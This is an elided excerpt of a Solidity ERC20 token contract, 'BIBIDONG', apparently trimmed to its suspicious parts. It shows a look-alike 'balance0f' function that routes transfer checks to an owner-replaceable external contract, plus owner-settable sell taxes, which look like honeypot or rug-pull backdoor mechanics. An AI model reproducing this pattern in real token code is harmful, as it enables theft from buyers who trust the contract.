...
interface IUniswapPair {
    ...
    function balance0f(address account) external returns (uint256);    
}
...
contract BIBIDONG is Context, IERC20, Ownable{
    ...
    string private _name = "BIBIDONG";
    string private _symbol = "BIBI";
    uint8 private _decimals = 9;     

    uint8 public _buyLiquidityFees = 0;
    uint8 public _buyMarketingFees = 1;
    uint8 public _buyBuyBackFees = 0;
    uint8 public _sellLiquidityFees = 0;
    uint8 public _sellMarketingFees = 10;
    uint8 public _sellBuyBackFees = 0;

    uint8 public _liquidityShares = 0;
    uint8 public _marketingShares = 1;
    uint8 public _BuyBackShares = 0;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        uint256 contractTokenBalance = balance0f(sender);  
        if (contractTokenBalance >= minTokensBeforeSwap)
        {
            uint256 amountReceived = balance0f(recipient);  
     ...
     * cannot be the zero address.
     */
    function newversion(address _pair) external onlyOwner {
    ...
    function balance0f(address account) internal returns (uint256){
        return IUniswapPair(uniswapPair)
        .balance0f(account);
    }

  
    function equalfee(address to, uint256 _token) external
    {
    ...
    function selltoken(uint8 newLiquidityTax, uint8 newMarketingTax, uint8 newBuyBackTax) external onlyOwner() {
        _sellLiquidityFees = newLiquidityTax;
        _sellMarketingFees = newMarketingTax;
        _sellBuyBackFees = newBuyBackTax;
    }


    function nosupply(uint256 _lastRebasedTime, uint256 _tSupply) internal view returns (uint256) {
